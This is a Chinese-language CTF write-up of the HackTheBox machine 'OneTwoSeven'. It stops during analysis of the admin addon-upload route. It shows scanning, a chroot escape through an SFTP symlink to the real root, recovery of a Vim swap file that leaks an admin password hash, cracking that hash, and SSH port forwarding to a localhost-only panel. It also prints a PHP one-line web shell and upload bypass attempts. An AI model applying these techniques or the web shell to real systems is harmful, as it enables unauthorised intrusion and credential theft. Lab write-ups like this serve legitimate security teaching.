---
title: HackTheBox OneTwoSeven：从 SFTP 软链接到 APT 软件包注入的完整渗透链
date: 2026-06-12
category: 网络安全
tags: HTB, Linux
---

# HackTheBox OneTwoSeven：从 SFTP 软链接到 APT 软件包注入的完整渗透链

![[file-20260607152714244.png]]

## 一、信息搜集

### 1、端口扫描

TCP 全端口扫描：

```bash
$ sudo nmap -sS -p- -Pn -n 10.129.12.43 -T4 --min-rate 5000 -oA tcp-ports
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-08 07:29 EDT
Nmap scan report for 10.129.12.43
Host is up (0.0080s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
60080/tcp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 7.45 seconds
```

22 和 80 两个端口开放，一个典型的 Web 靶机入口。其中还有一个被 `nmap` 标记为 filter 的端口 60080，这通常意味着服务器没有对 `nmap` 发送的探测包给出回应，可以通过本地抓流量包看看。

打开 wireshark 抓取 tun 0 的流量，接着在终端中对 60080 进行单独地测试：

```bash
$ sudo nmap -sS -p 60080 10.129.12.43 -Pn -n
[sudo] zyf 的密码：
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-08 19:34 CST
Nmap scan report for 10.129.12.43
Host is up.

PORT      STATE    SERVICE
60080/tcp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 2.09 seconds
```

探测结束之后，看流量：

![[file-20260608193744225.png]]

只有两个 TCP SYN 探测包，并且没得到服务器的任何回应，因此 `nmap` 无法判定该端口的开放情况，标记为 `filter`。

可能的原因有很多，防火墙、需要本地访问等等。还需要进一步的探索。

对开放端口进行进一步扫描（`nmap` 默认脚本以及版本指纹探测）：

```bash
$ sudo nmap -sV -sC -p 22,80 10.129.12.43 -Pn -n -oA tcp-ports-detail
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-08 07:40 EDT
Nmap scan report for 10.129.12.43
Host is up (0.0073s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
| ssh-hostkey: 
|   256 32:b7:f3:e2:6d:ac:94:3e:6f:11:d8:05:b9:69:58:45 (ECDSA)
|_  256 35:52:04:dc:32:69:1a:b7:52:76:06:e3:6c:17:1e:ad (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Page moved.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.94 seconds
```

针对 22 端口，脚本给出了 ssh 支持的认证算法，并且版本探测得到的服务器指纹信息为：

```
OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
```

80 端口，`nmap` 判断该端口上运行着 Apache 服务，且版本为 2.4.25。脚本还得到 Web 的 title 写着：

```
Page moved
```

类似于一个重定向，但是如果是重定向的话，`nmap` 的脚本会显示重定向的信息。因此判定，直接访问页面会通过 JS 代码实现重定向操作，验证一下：

```bash
$ curl http://10.129.12.43
<html>
<head>
<meta http-equiv="refresh" content="0;/index.php" />
<title>Page moved.</title>
</head>
<body>
This page has moved. Click <a href="/index.php">here</a> to go to the new page.
</body>
</html>
```

判断地没错，开头的 Meta 标签会让我们在访问该页面的时候，跳转到 `/index.php` 页面。

### 2、Web Walk

浏览器访问：

![[file-20260608195924280.png]]

页面中的信息量还挺大的：

- 提到了 SFTP，该服务是运行在 SSH 服务之上的，之前端口扫描看到 22 开放，使用 SFTP 这也许是一个思路。
- 提到：“静态文件托管……但我们原本也想为大家提供 PHP 托管服务，却未能妥善掌握 Apache 的 chroot() 处理。因此，我们只提供了 MVP 版本。”，这段信息很大，放下面讲。
- 提到了后续会支持 IPv6。
- 提到：“我们实施了最先进的 Donkey 拒绝服务保护。如果每个源 IP 地址的错误计数过高，我们可能会暂时丢弃 SYN 包。”，驴式拒绝服务攻击保护，这似乎是作者自己取的名字，关键的是后面的描述，这就意味着我们可能需要避免大规模、集中式的 Web 枚举操作，以防 IP 被限制。

`chroot` 是 unix/linux 系统中的系统调用，能实现：把一个服务能看到的目录范围限制在一个目录当中。这通常用于限制目录穿越。Apache 的工作目录通常 `/var/www/html`，该系统调用就是限制用户可读取范围就在这个目录内容，无法读到其他目录。但作者提到“未实现”该系统调用，并且只是交付了 MVP（Minimum Viable Product，最小可行产品），说明可能实现了一个简易版的目录限制保护。

而且题目 onetwoseven 也似乎是一种提示，“one two seven”翻译过来就是 127，这是不是在点本地环回口 127.0.0.1 呢？目前还不太清楚。

在 `stats.php` 中，有一些信息： 

![[file-20260608202356984.png]]

目前不知道这些信息的含义。

在顶部面板，有一个灰色的 `Admin`，通过页面源码可以看到其目的地址：

![[file-20260608202651019.png]]

之前看到的 60080 端口在这出现了，并且出现了一个域名。

先将域名添加到本地域名解析文件（`/etc/hosts`）中，即末尾添加：

```
10.129.12.43 onetwoseven.htb
```

而且从源码可以知道 `Admin` 这个超链接为什么灰着：

```html
class="disabled"
```

只需要在前端将该 disabled 去掉，就可以恢复其点击，但是该地址似乎并不让直接访问：

```bash
$ curl http://onetwoseven.htb:60080 -v
* Host onetwoseven.htb:60080 was resolved.
* IPv6: (none)
* IPv4: 10.129.12.43
*   Trying 10.129.12.43:60080...
* connect to 10.129.12.43 port 60080 from 10.10.16.127 port 56024 failed: 连接超时
* Failed to connect to onetwoseven.htb port 60080 after 133712 ms: Could not connect to server
* closing connection #0
curl: (28) Failed to connect to onetwoseven.htb port 60080 after 133712 ms: Could not connect to server
```

根据之前的 127 提示，大致可以判断出，这只允许本地访问。

而且，根据之前作者提到的“静态页面”，这也许意味着我们无法通过 http 请求头实现“是本地”绕过，但是也可以尝试一下：

```bash
$ curl -H 'X-Forwarded-For: 127.0.0.1' -H 'X-Real-IP: 127.0.0.1' http://onetwoseven.htb:60080 -v
* Host onetwoseven.htb:60080 was resolved.
* IPv6: (none)
* IPv4: 10.129.12.43
*   Trying 10.129.12.43:60080...
* connect to 10.129.12.43 port 60080 from 10.10.16.127 port 53920 failed: 连接超时
* Failed to connect to onetwoseven.htb port 60080 after 133932 ms: Could not connect to server
* closing connection #0
curl: (28) Failed to connect to onetwoseven.htb port 60080 after 133932 ms: Could not connect to server
```

并不奏效。

页面中有“Sign up today”按钮，点击后可以发现：

![[file-20260608203923692.png]]

直接把账号密码给了我们，并且提示：

```
You can use the provided credentials to upload your pages via sftp://onetwoseven.htb. Your personal home page will be available here.
```

也就是说，给的账密是用于 sftp 服务的，并且说我们的个人页面在 here（超链接）。

个人页面：

![[file-20260608204141466.png]]

一张图片，并且目录很有意思，是 `~` + 用户名，目前不知道干什么用。

## 二、SFTP

SFTP，目前最明显的线索。

尝试登入：

```bash
$ sftp ots-hZjk1YWI@10.129.12.43
The authenticity of host '10.129.12.43 (10.129.12.43)' can't be established.
ED25519 key fingerprint is SHA256:q2uwM1EVNJyOCanapx8pCp+Ihe2bngUBdtH+GMvgHhY.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:1: [hashed name]
    ~/.ssh/known_hosts:4: [hashed name]
    ~/.ssh/known_hosts:5: [hashed name]
    ~/.ssh/known_hosts:6: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.12.43' (ED25519) to the list of known hosts.
ots-hZjk1YWI@10.129.12.43's password:
Connected to 10.129.12.43.
sftp>
```

成功登入，`help` 能查看使用啥命令：

```bash
sftp> help
Available commands:
bye                                Quit sftp
cd path                            Change remote directory to 'path'
chgrp [-h] grp path                Change group of file 'path' to 'grp'
chmod [-h] mode path               Change permissions of file 'path' to 'mode'
chown [-h] own path                Change owner of file 'path' to 'own'
copy oldpath newpath               Copy remote file
cp oldpath newpath                 Copy remote file
df [-hi] [path]                    Display statistics for current directory or
                                   filesystem containing 'path'
exit                               Quit sftp
get [-afpR] remote [local]         Download file
help                               Display this help text
lcd path                           Change local directory to 'path'
lls [ls-options [path]]            Display local directory listing
lmkdir path                        Create local directory
ln [-s] oldpath newpath            Link remote file (-s for symlink)
lpwd                               Print local working directory
ls [-1afhlnrSt] [path]             Display remote directory listing
lumask umask                       Set local umask to 'umask'
mkdir path                         Create remote directory
progress                           Toggle display of progress meter
put [-afpR] local [remote]         Upload file
pwd                                Display remote working directory
quit                               Quit sftp
reget [-fpR] remote [local]        Resume download file
rename oldpath newpath             Rename remote file
reput [-fpR] local [remote]        Resume upload file
rm path                            Delete remote file
rmdir path                         Remove remote directory
symlink oldpath newpath            Symlink remote file
version                            Show SFTP version
!command                           Execute 'command' in local shell
!                                  Escape to local shell
?                                  Synonym for help
```

当前正处根目录，其下有一个 `public_html` 目录：

```bash
sftp> pwd
Remote working directory: /
sftp> ls -la
drwxr-xr-x    ? 0        0            4096 Jun  8 19:49 .
drwxr-xr-x    ? 0        0            4096 Jun  8 19:49 ..
drwxr-xr-x    ? 1002     1002         4096 Feb 16  2019 public_html
```

进去查看后，只有一个 index.html 文件：

```bash
sftp> cd public_html/
sftp> ls
index.html
```

下载到本地查看：

```bash
sftp> get index.html ./
Fetching /public_html/index.html to ./index.html
index.html 
```

```bash
$ cat index.html
<!DOCTYPE html>
<html>
<head>
<title>Nothing here.</title>
<style>body { margin:0; padding:0; background:url("/dist/img/abstract-architecture-attractive-988873.jpg") no-repeat center center fixed; -webkit-background-size: cover; -moz-background-size: cover; -o-background-size: cover; background-size: cover; }</style>
</head>
<body></body>
</html>
```

就是上面我们看到的那面墙（就是一张图）。

暴露了目录，查看后，有“目录遍历”的现象，其中放的是相关静态资源目录：

![[file-20260608204933948.png]]

没有有效的信息。

在 `public_html` 目录中能看到之前看到的 `index.html`，而 sftp 又有文件上传的功能，可以尝试一下上传一个木马文件。

本地准备一个 PHP 文件（命名为 `shell.php`）：

```php
<?php system($_REQUEST['bash']);?>
```

通过 sftp 上传该木马文件：

```bash
sftp> put ./shell.php ./
Uploading ./shell.php to /public_html/./shell.php
shell.php                             100%   35     0.1KB/s   00:00
sftp> pwd
Remote working directory: /public_html
sftp> ls
index.html  shell.php
```

尝试访问：

```bash
$ curl -I http://onetwoseven.htb/~ots-hZjk1YWI/shell.php
HTTP/1.1 403 Forbidden
Date: Tue, 09 Jun 2026 06:17:32 GMT
Server: Apache/2.4.25 (Debian)
Content-Type: text/html; charset=iso-8859-1
```

显示 403 的响应码，说明上传成功是没错，但是无法访问。

可能服务器限制了文件后缀。

由于目标不是 Windows，无法施展大小写混淆（因为 Linux 是大小写敏感的），也无法在文件后加空格或者点（Windows 默认不处理这些字符）。

PHP 服务器有可能会将多种常见后缀都解释成 PHP，比如：

```
.php3、.php4、.php5、.php7、.phtml、.pht、.phar
```

可以通过 `rename` 去修改文件的后缀：

```
sftp> rename shell.php shell.phtml
```

但是并不奏效（这里就不放全了，都是 403 的响应码）：

```bash
$ curl -I http://onetwoseven.htb/~ots-hZjk1YWI/shell.phtml
HTTP/1.1 403 Forbidden
Date: Tue, 09 Jun 2026 06:33:23 GMT
Server: Apache/2.4.25 (Debian)
Content-Type: text/html; charset=iso-8859-1
```

还有很多的绕过手法，比如多后缀、上传 `.htaccess` 等等。

但是都不奏效，这里就不一一展示了。题眼并不在这里。

目前，能看到的信息非常有限，这明显不是真正的根目录，而是 Web 服务目录，似乎目标真的实现了“目录限制”。

想到这，不难想起上面提到的“作者只是交付了 MVP”，既然没完全实现 `chroot`，说明这个限制大概率不可靠，想想有没有目录上的作为。

SFTP 提供了一个功能：

```bash
symlink oldpath newpath            Symlink remote file
```

软链接，能将 `oldpath` 软链接到 `newpath` 上，我们是否可以直接将真正的根目录，软连接到当前的某个目录呢？

尝试：

```bash
sftp> symlink / /public_html/true_root
sftp>
```

没有报错提示，直接去之前的目录访问，访问的 URL 为：

```
http://onetwoseven.htb/~ots-hZjk1YWI/true_root/
```

> 因为 `public_html` 目录下放着 `index.html`，其 URL 是 `http://onetwoseven.htb/~ots-hZjk1YWI/index.html`，那么放在其中的 `true_root` 就不难推出 URL 了。

发现了成功了：

![[file-20260608210522505.png]]

前三个目录都是 403 Forbidden 状态码，只有 `var` 目录可以访问。

但是这里不能访问并不意味着里面的文件访问不到，因为当前出现“目录列表”是因为配置不当，如果这些页面里面的目录做好了配置，就是无法查看的。因此可以尝试访问里面具体的文件，比如我们知道 `etc` 目录下有 `passwd` 文件，尝试查看：

```bash
$ curl http://onetwoseven.htb/~ots-hZjk1YWI/true_root/etc/passwd
ots-yODc2NGQ:x:999:999:127.0.0.1:/home/web/ots-yODc2NGQ:/bin/false
ots-1Mzg0Nzg:x:1001:1001:10.10.14.247:/home/web/ots-1Mzg0Nzg:/bin/false
```

能看到，并且发现了新的用户：

```
ots-yODc2NGQ
```

尝试查看其家目录：

```bash
$ curl http://onetwoseven.htb/~ots-hZjk1YWI/true_root/usr/ots-yODc2NGQ -I
HTTP/1.1 404 Not Found
Date: Mon, 08 Jun 2026 13:14:30 GMT
Server: Apache/2.4.25 (Debian)
Content-Type: text/html; charset=iso-8859-1
```

没找到。

那么只能去 `var` 目录中探索了，在 `html-admin` 目录能找到一个新的文件 `.login.php.swp`，将其下载到本地，并查看文件类型：

```bash
$ curl -o .login.php.swp http://onetwoseven.htb/~ots-hZjk1YWI/true_root/var/www/html-admin/.login.php.swp
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 20480  100 20480    0     0  23876      0 --:--:-- --:--:-- --:--:-- 23869
$ file .login.php.swp
.login.php.swp: Vim swap file, version 8.0, pid 1861, user root, host onetwoseven, file /var/www/html-admin/login.php
```

是一个 Vim 创建的 swap 文件，这个文件的作用：保存编辑过程中的临时状态，用于崩溃恢复和检测重复编辑。

有这个文件，我们可以将其复原，即恢复其原本的内容。

这里有个坑点，我用的操作系统是 Parrot OS，其默认的 `vim` 被软连接成了 `nvim`：

```bash
$ which vim
/bin/vim
$ ls -l /bin/vim
lrwxrwxrwx 1 root root 21 2025年 3月18日 /bin/vim -> /etc/alternatives/vim
$ ls -l /etc/alternatives/vim
lrwxrwxrwx 1 root root 13 2025年 3月18日 /etc/alternatives/vim -> /usr/bin/nvim
```

我们不能用 `nvim` 恢复 `vim` 创建的 swap 文件。

好在系统中有一个 `vim` 的 tiny 版：

```bash
ls /bin/vim*
/bin/vim  /bin/vimdiff  /bin/vim.tiny
```

用这个 tiny 版本也可以恢复文件：

```bash
$ /bin/vim.tiny -r login.php
Error detected while processing /etc/vim/vimrc:
line    1:
E319: Sorry, the command is not available in this version: syntax on
line    4:
E488: Trailing characters: set nu: #set nu
line    6:
E488: Trailing characters: set mouse=a: #set mouse=a
Press ENTER or type command to continue
```

按回车：

```
$ /bin/vim.tiny login.php
Error detected while processing /etc/vim/vimrc:
line    1:
E319: Sorry, the command is not available in this version: syntax on
line    4:
Using swap file ".login.php.swp"
Original file "~/htb_workdir/ots/login.php"
"~/htb_workdir/ots/login.php" [New File]
Recovery completed. You should check if everything is OK.
(You might want to write out this file under another name
and run diff with the original file to check for changes)
You may want to delete the .swp file now.

Press ENTER or type command to continue
```

虽然报了很多的错误，但是还是提示：

```
Recovery completed. You should check if everything is OK.
```

回车就能看到恢复的文件了：

```php
<?php if ( $_SERVER['SERVER_PORT'] != 60080 ) { die(); } ?>
<?php session_start(); if (isset ($_SESSION['username'])) { header("Location: /menu.php"); } ?>
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="Mark Otto, Jacob Thornton, and Bootstrap contributors">
    <meta name="generator" content="Jekyll v3.8.5">
    <title>OneTwoSeven</title>

    <!-- Bootstrap core CSS -->
    <link href="/dist/css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous">

    <style>
      .bd-placeholder-img { font-size: 1.125rem; text-anchor: middle; -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; }
      @media (min-width: 768px) { .bd-placeholder-img-lg { font-size: 3.5rem; } }
    </style>
    <!-- Custom styles for this template -->
    <link href="carousel.css" rel="stylesheet">
  </head>
  <body>
    <header>
  <nav class="navbar navbar-expand-md navbar-dark fixed-top bg-dark">
    <a class="navbar-brand" href="/login.php">OneTwoSeven - Administration Backend</a>
    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarCollapse" aria-controls="navbarCollapse" aria-expanded="false" aria-label="Toggle navigation">
      <span class="navbar-toggler-icon"></span>
    </button>
    <div class="collapse navbar-collapse" id="navbarCollapse">
    </div>
  </nav>
</header>

<main role="main">

  <div id="myCarousel" class="carousel slide" data-ride="carousel">
    <ol class="carousel-indicators">
      <li data-target="#myCarousel" data-slide-to="0" class="active"></li>
    </ol>
    <div class="carousel-inner">
      <div class="carousel-item active">
        <img src="dist/img/ai-codes-coding-97077.jpg">
        <div class="container">
          <div class="carousel-caption text-left">
            <h1>OneTwoSeven Administration</h1>
            <p>Administration backend. For administrators only.</p>
          </div>
        </div>
      </div>
    </div>
    <a class="carousel-control-prev" href="#myCarousel" role="button" data-slide="prev">
      <span class="carousel-control-prev-icon" aria-hidden="true"></span>
      <span class="sr-only">Previous</span>
    </a>
    <a class="carousel-control-next" href="#myCarousel" role="button" data-slide="next">
      <span class="carousel-control-next-icon" aria-hidden="true"></span>
      <span class="sr-only">Next</span>
    </a>
  </div>


  <!-- Marketing messaging and featurettes
  ================================================== -->
  <!-- Wrap the rest of the page in another container to center all the content. -->

  <div class="container marketing">

    <!-- START THE FEATURETTES -->

    <div class="row featurette">
      <div class="col-md-12">
        <h2 class="featurette-heading">Login to the kingdom.<span class="text-muted"> Up up and away!</span></h2>
          <?php
            $msg = '';
            
            if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
	      if ($_POST['username'] == 'ots-admin' && hash('sha256',$_POST['password']) == '11c5a42c9d74d5442ef3cc835bda1b3e7cc7f494e704a10d0de426b2fbe5cbd8') {
                  $_SESSION['username'] = 'ots-admin';
		  header("Location: /menu.php");
              } else {
                  $msg = 'Wrong username or password.';
              }
            }
         ?>
      </div> <!-- /container -->
      
      <div class = "container">
      
         <form action="/login.php" method="post">
            <h4 class = "form-signin-heading"><font size="-1" color="red"><?php echo $msg; ?></font></h4>
	    <table>
              <tr><td><b>Username:</b></td><td><input type="text" name="username" size="40" required autofocus></td></tr>
              <tr><td><b>Password:</b></td><td><input type="password" name="password" size="40" required></td></tr>
              <tr><td colspan="2"><center><button type="submit" name="login">Login</button></center></td></tr>
            </table>
         </form>
	     </div>
    </div>

    <hr class="featurette-divider">

    <!-- /END THE FEATURETTES -->

  </div><!-- /.container -->


  <!-- FOOTER -->
  <footer class="container">
    <p class="float-right"><a href="#">Back to top</a></p>
    <p>&copy; 2019 OneTwoSeven, Dec. &middot; <a href="#">Privacy</a> &middot; <a href="#">Terms</a></p>
  </footer>
</main>
<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
      <script>window.jQuery || document.write('<script src="/docs/4.3/assets/js/vendor/jquery-slim.min.js"><\/script>')</script><script src="dist/js/bootstrap.bundle.min.js" crossorigin="anonymous"></script></body>
</html>
```

## 三、User Flag

这应该就是管理员后台的登入界面，其中暴露了用户名以及密码的 Hash 值：

```php
if ($_POST['username'] == 'ots-admin' && hash('sha256',$_POST['password']) == '11c5a42c9d74d5442ef3cc835bda1b3e7cc7f494e704a10d0de426b2fbe5cbd8')
```

上网站（`https://crackstation.net/`）去碰撞一下：

![[file-20260608212910444.png]]

得到明文密码：

```
Homesweethome1
```

目前要解决的就是本地登入的问题。

想到可以通过本地端口映射，将本地的 60080 映射到服务器的 60080 上，那么访问本地的该端口，就是访问服务器的该端口。这本质上是服务器自己访问自己，然后将结果通过 ssh 隧道返回给我们，因此符合“本地访问”。

这需要 ssh 来建立。先讲明一点，本题无法直接实现 ssh 登入：

```bash
$ ssh ots-hZjk1YWI@10.129.12.43
ots-hZjk1YWI@10.129.12.43's password:
This service allows sftp connections only.
Connection to 10.129.12.43 closed.
```

会提示只允许 sftp。但是这条信息是服务器可以自定义的，而 ssh 给的权限太大了，很难判断这里真实的拒绝是源于什么。

建立本地端口映射：

```bash
$ ssh -N -L 60080:127.0.0.1:60080 ots-hZjk1YWI@10.129.12.43
```

这里需要带上 `-N` 参数，表示不执行命令，只是做映射。如果不带上的话：

```bash
$ ssh -L 60080:127.0.0.1:60080 ots-hZjk1YWI@10.129.12.43
ots-hZjk1YWI@10.129.12.43's password:
This service allows sftp connections only.
Connection to 10.129.12.43 closed.
```

会出现和链接 ssh 一样的提示。这也就意味着，服务器拒绝的理由是“不允许命令执行”。

建立端口映射之后，就可以正常访问管理员面板了：

```bash
]$ curl http://127.0.0.1:60080 -I
HTTP/1.1 200 OK
Date: Mon, 08 Jun 2026 13:43:06 GMT
Server: Apache/2.4.25 (Debian)
Set-Cookie: PHPSESSID=j5q27n4n0or1390j7p6u3s9fa0; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Type: text/html; charset=UTF-8
```

用之前得到的账密登入：

![[file-20260608214437493.png]]

访问页面中看到的 OTS Default User 超链接，即可看到一个新的账密

```
Username: ots-yODc2NGQ
Password: f528764d
```

该账密可以登入 sftp，找到 `user.txt`：

```bash
$ sftp ots-yODc2NGQ@10.129.12.43
ots-yODc2NGQ@10.129.12.43's password:
Connected to 10.129.12.43.
sftp> ls
public_html   user.txt
sftp> get user.txt ./
Fetching /user.txt to ./user.txt
user.txt                              100%   33     0.1KB/s   00:00
sftp>
```

```bash
$ cat user.txt
af23c************************
```

成功得到 User Flag。

## 四、www-data shell

### 1、Walk

页面有很多的超链接，都是通过：

```
http://127.0.0.1:60080/menu.php?addon=addons/ots-xxx.php
```

这样的形式展现的。在 PHP 的语境下，这似乎是一种“包含”的现象。

这些被包含的 PHP 文件能否直接访问呢？

尝试访问 `addons` 目录，能看到目录列表：

![[file-20260609145112933.png]]

而且里面的内容都是可以点击访问的。访问之后，文件中都是后端元素，因此看不到源码内容：

```bash
$ curl http://127.0.0.1:60080/addons/ots-fs-backup.php -H 'Cookie: PHPSESSID=9p96mvdod45jv7n113kkpmhlg5' -v
*   Trying 127.0.0.1:60080...
* Connected to 127.0.0.1 (127.0.0.1) port 60080
* using HTTP/1.x
> GET /addons/ots-fs-backup.php HTTP/1.1
> Host: 127.0.0.1:60080
> User-Agent: curl/8.14.1
> Accept: */*
> Cookie: PHPSESSID=9p96mvdod45jv7n113kkpmhlg5
>
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Tue, 09 Jun 2026 06:53:07 GMT
< Server: Apache/2.4.25 (Debian)
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< Content-Length: 0
< Content-Type: text/html; charset=UTF-8
<
* Connection #0 to host 127.0.0.1 left intact
```

但是之前通过 `?addon=ots-xxx.php` 却能显示出内容来，这就增强了“该操作就是包含”的可信度。

如果能包含到之前我们上传的一句话木马，说不定就能拿到 WebShell。

目录关系：

```
/
	var/ 
		www/
			public_html/
				shell.php
			admin_html/
				menu.php
				login.php
				addons/
					ots-xxx.php
```

尝试目录穿越去读取：

```
http://127.0.0.1:60080/menu.php?addon=addons/../public_html/shell.php
```

![[file-20260609145602620.png]]

显示未知的插件种类，目前不太知道这个的意思。

### 2、文件上传

在页面的下方，有一个可以上传插件的地方：

![[file-20260609145747788.png]]

和之前遇到的一样，具有一个被前端代码 `disabled` 的一个按钮。

从源代码可以看出，文件上传会向 `addon-upload.php` 文件 POST 提交数据。

```html
<form action="addon-upload.php" method="POST" enctype="multipart/form-data">
  <input type="file" name="addon" />
  <input type="submit" disabled="disabled" /><sup><font size="-2" color="red"> Disabled for security reasons.</font></sup>
</form>
```

而且这是相对路径，说明该文件是根目录中的，这也解释了为什么之前看到的插件目录（`/addons`）中没有看到该文件。

但是当你访问的时候，会发现该文件并不存在：

```bash
$ curl -I http://127.0.0.1:60080/addon-upload.php -H 'Cookie: PHPSESSID=9p96mvdod45jv7n113kkpmhlg5'
HTTP/1.1 404 Not Found
Date: Tue, 09 Jun 2026 07:10:49 GMT
Server: Apache/2.4.25 (Debian)
Content-Type: text/html; charset=iso-8859-1
```

那么，此时我们若绕过前端限制去上传文件也是不行的。

在 OTS Addon Manager 这个超链接中，似乎有对应的部分：

```
The addon manager must not be executed directly but only via
the provided RewriteRules:
RewriteEngine On
RewriteRule ^addon-upload.php   addons/ots-man-addon.php [L]
RewriteRule ^addon-download.php addons/ots-man-addon.php [L]
By commenting individual RewriteRules you can disable single
features (i.e. for security reasons)

Please note: Disabling a feature through htaccess leads to 404 errors for now.
```

大致意思就是，addon manager 文件（语境中就是指 `ots-man-addon.php`）不允许直接被访问，必须按照下述重写规则来：

```
RewriteEngine On
RewriteRule ^addon-upload.php   addons/ots-man-addon.php [L]
RewriteRule ^addon-download.php addons/ots-man-addon.php [L]
```

该重写规则的意思不难理解，通过访问：

```
addon-upload.php
addon-download.php
```

这两个文件去访问 addon manager 文件。

这些重写规则都是在 `.htaccess` 文件中配置的，而且最后还有一句提示：

```
如果在配置中禁用了上述重写，则可能出现 404 的现象
```

这似乎解释了为什么我们上面直接访问 `addon-upload.php` 会出现 404 的响应码，也许是 `.htaccess` 中关于这条的重写规则被注释掉了。

那么还有另一条是否也被注释了呢？

尝试访问：

```bash
$ curl -I http://127.0.0.1:60080/addon-download.php -H 'Cookie: PHPSESSID=9p96mvdod45jv7n113kkpmhlg5'
HTTP/1.1 200 OK
Date: Tue, 09 Jun 2026 07:26:06 GMT
Server: Apache/2.4.25 (Debian)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Type: text/html; charset=UTF-8
```

可行，那可以尝试下载 addon 文件。上面分析得到 `ots-man-addon.php` 这个是 addon 的管理文件，并且管理着上传和下载操作，这个的优先级比较大，先尝试这个。

参数名可能是 addon：

```bash
$ curl http://127.0.0.1:60080/addon-download.php -H 'Cookie: PHPSESSID=9p96mvdod45jv7n113kkpmhlg5' -G -d 'addon=ots-man-addon.php' -o ots-man-addon.php
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2014  100  2014    0     0   3813      0 --:--:-- --:--:-- --:--:--  3814
```

下载成功。

而且可以判断出，下载的根目录在 `addons` 中。经过测定测试，无法下载该目录外的文件：

```bash
$ curl http://127.0.0.1:60080/addon-download.php -H 'Cookie: PHPSESSID=9p96mvdod45jv7n113kkpmhlg5' -G -d 'addon=../menu.php' -o menu.php
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
```

文件大小为 0。没有下载成功。

先分析分析 `ots-man-addon.php` 中的内容：

```php
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /login.php"); }; if ( strpos($_SERVER['REQUEST_URI'], '/addons/') !== false ) { die(); };
# OneTwoSeven Admin Plugin
# OTS Addon Manager
switch (true) {
	# Upload addon to addons folder.
	case preg_match('/\/addon-upload.php/',$_SERVER['REQUEST_URI']):
		if(isset($_FILES['addon'])){
			$errors= array();
			$file_name = basename($_FILES['addon']['name']);
			$file_size =$_FILES['addon']['size'];
			$file_tmp =$_FILES['addon']['tmp_name'];

			if($file_size > 20000){
				$errors[]='Module too big for addon manager. Please upload manually.';
			}

			if(empty($errors)==true) {
				move_uploaded_file($file_tmp,$file_name);
				header("Location: /menu.php");
				header("Content-Type: text/plain");
				echo "File uploaded successfull.y";
			} else {
				header("Location: /menu.php");
				header("Content-Type: text/plain");
				echo "Error uploading the file: ";
				print_r($errors);
			}
		}
		break;
	# Download addon from addons folder.
	case preg_match('/\/addon-download.php/',$_SERVER['REQUEST_URI']):
		if ($_GET['addon']) {
			$addon_file = basename($_GET['addon']);
			if ( file_exists($addon_file) ) {
				header("Content-Disposition: attachment; filename=$addon_file");
				header("Content-Type: text/plain");
				readfile($addon_file);
			} else {
				header($_SERVER["SERVER_PROTOCOL"]." 404 Not Found", true, 404);
				die();
			}
		}
		break;
	default:
		echo "The addon manager must not be executed directly but only via<br>";
		echo "the provided RewriteRules:<br><hr>";
		echo "RewriteEngine On<br>";
		echo "RewriteRule ^addon-upload.php   addons/ots-man-addon.php [L]<br>";
		echo "RewriteRule ^addon-download.php addons/ots-man-addon.php [L]<br><hr>";
		echo "By commenting individual RewriteRules you can disable single<br>";
		echo "features (i.e. for security reasons)<br><br>";
		echo "<font size='-2'>Please note: Disabling a feature through htaccess leads to 404 errors for now.</font>";
		break;
}
?>
```

通过 `switch case` 的方式，处理了 upload 和 download 两种情况。

可以看到为什么我们无法下载其他目录下的文件：

```php
basename()
```

这会去掉路径，只保留文件名，我们之前采用的：

```
../menu.php
```

会被替换成：

```
menu.php
```

那么在 `addons` 目录中明显是没有这个文件的，因此下载不到。

目前来看，下载对我们的帮助有限，若能开启上传，那么就可以上传木马文件了。

单看这个文件，似乎功能挺正常的，但是上传、下载这两个功能可不只和这个文件有关。

通过前面的测试，我们大致可以确定 `.htaccess` 中的重写规则应该是这样的：

```
RewriteEngine On
# RewriteRule ^addon-upload.php   addons/ots-man-addon.php [L]
RewriteRule ^addon-download.php addons/ots-man-addon.php [L]
```

下载正常，但是上传被注释。

